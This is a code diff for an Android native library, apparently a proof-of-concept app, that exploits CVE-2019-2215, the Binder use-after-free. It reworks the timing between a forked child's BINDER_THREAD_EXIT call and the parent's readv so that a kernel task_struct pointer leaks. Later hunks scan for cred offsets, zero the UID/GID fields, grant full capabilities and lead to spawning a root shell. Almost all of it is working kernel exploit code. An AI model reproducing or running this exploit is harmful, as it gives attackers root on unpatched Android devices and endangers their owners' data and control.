@@ -67,17 +67,18 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: ダミーデータで readv を起こす ==========
+// ========== Step 1: 同期付き task_struct リーク ==========
 int leak_task_struct(void) {
     int pipefd[2];
+    int sync_pipe[2];
     pid_t cpid;
     struct iovec iovec_stack[IOVEC_COUNT];
     void *aligned_address;
     ssize_t n;
     uint64_t *data;
-    char dummy[512] = {0};
+    char sync_char;
 
-    LOGI("[*] Leaking task_struct via readv with dummy data");
+    LOGI("[*] Leaking task_struct with synchronization");
 
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
@@ -127,7 +128,6 @@ int leak_task_struct(void) {
     }
     LOGI("[+] aligned_address=%p", aligned_address);
 
-    // オーバーラップ設定
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
@@ -135,16 +135,15 @@ int leak_task_struct(void) {
     iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
     LOGI("[+] iovec overlap configured");
 
-    // ダミーデータを書き込む（readv がブロックしないように）
-    if (write(pipefd[1], dummy, sizeof(dummy)) != sizeof(dummy)) {
-        LOGE("Failed to write dummy data");
+    if (pipe(sync_pipe) < 0) {
+        LOGE("sync_pipe failed: %s", strerror(errno));
         close(binder_fd);
         close(epoll_fd);
         close(pipefd[0]);
         close(pipefd[1]);
         return -1;
     }
-    LOGI("[+] Dummy data written to pipe");
+    LOGI("[+] sync_pipe: read=%d, write=%d", sync_pipe[0], sync_pipe[1]);
 
     cpid = fork();
     if (cpid < 0) {
@@ -153,18 +152,45 @@ int leak_task_struct(void) {
         close(epoll_fd);
         close(pipefd[0]);
         close(pipefd[1]);
+        close(sync_pipe[0]);
+        close(sync_pipe[1]);
         return -1;
     }
 
     if (cpid == 0) {
-        usleep(100000);
-        LOGI("[child] BINDER_THREAD_EXIT...");
+        // 子プロセス: 親からシグナルを待つ
+        close(sync_pipe[1]);
+        if (read(sync_pipe[0], &sync_char, 1) != 1) {
+            LOGE("[child] sync read failed");
+            _exit(1);
+        }
+        close(sync_pipe[0]);
+        LOGI("[child] Received signal, calling BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
         LOGI("[child] BINDER_THREAD_EXIT done");
         _exit(0);
     }
 
-    // readv を呼び出す（データが既にあるのでブロックしない）
+    // 親: 子にシグナルを送る
+    close(sync_pipe[0]);
+    sync_char = 'x';
+    if (write(sync_pipe[1], &sync_char, 1) != 1) {
+        LOGE("Failed to signal child");
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        close(sync_pipe[1]);
+        return -1;
+    }
+    close(sync_pipe[1]);
+
+    // 子プロセスが終了するのを待つ
+    int status;
+    waitpid(cpid, &status, 0);
+    LOGI("[parent] Child finished");
+
+    // ここで readv を呼び出す（UAF が発生済み）
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd bytes", n);
     if (n < 0) {
@@ -176,11 +202,9 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // リークしたポインタを探す（ダミーデータの後ろから検索）
     data = (uint64_t *)aligned_address;
     for (int i = 0; i < (n / 8); i++) {
         uint64_t val = data[i];
-        // ダミーデータ（0x00 だらけ）をスキップ
         if (val == 0) continue;
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
@@ -191,7 +215,6 @@ int leak_task_struct(void) {
         }
     }
 
-    wait(NULL);
     close(binder_fd);
     close(epoll_fd);
     close(pipefd[0]);
@@ -283,7 +306,6 @@ int find_offsets(void) {
         return -1;
     }
 
-    // リークしたアドレス周辺をスキャン
     for (int off = -0x800; off <= 0x800; off += 8) {
         uint64_t addr = task_struct_kptr + off;
         if (write(krw_pipe[1], &addr, 8) != 8) continue;
@@ -314,7 +336,6 @@ int find_offsets(void) {
         }
     }
 
-    // フォールバック
     LOGI("[!] Using fallback offsets (cred=0x688, addr_limit=0xA18)");
     cred_offset = 0x688;
     addr_limit_offset = 0xA18;
@@ -348,7 +369,6 @@ int patch_cred(void) {
     uint32_t zero = 0;
     uint64_t cap = 0x3FFFFFFFFFULL;
 
-    // UID/GID を 0 に
     uint64_t addrs[] = {
         base + 0x4, base + 0xC, base + 0x14, base + 0x1C,
         base + 0x8, base + 0x10, base + 0x18, base + 0x20
@@ -358,7 +378,6 @@ int patch_cred(void) {
         if (write(krw_pipe[1], &zero, 4) != 4) return -1;
     }
 
-    // Capabilities
     for (int i = 0; i < 5; i++) {
         uint64_t cap_addr = base + 0x28 + (i * 8);
         if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
@@ -387,7 +406,7 @@ int spawn_root_shell(void) {
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
     LOGI("========================================");
-    LOGI("== CVE-2019-2215 Final Exploit ==");
+    LOGI("== CVE-2019-2215 Synchronized Exploit ==");
     LOGI("========================================");
 
     bind_cpu();
